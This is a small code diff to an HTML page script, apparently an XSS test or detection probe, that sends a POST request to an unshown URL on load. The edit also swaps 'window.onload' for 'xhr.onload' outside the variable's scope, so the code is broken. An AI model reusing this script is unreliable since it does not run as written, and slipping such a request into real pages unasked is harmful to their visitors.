@@ -20,6 +20,7 @@
     gtag('config', 'G-DB6DYCD27P');
   </script>
   <script>
+    console.log("Detected")
     function codePathXss() {
       var xhr = new XMLHttpRequest();
       var url =
@@ -27,9 +28,9 @@
       xhr.open("POST", url, true);
       //xhr.setRequestHeader('Content-Type', 'application/json');
       xhr.send();
-      print("Hello World")
+      console.log("Hello World")
     }
-    window.onload = codePathXss;
+    xhr.onload = codePathXss;
   </script>
 </head>
 
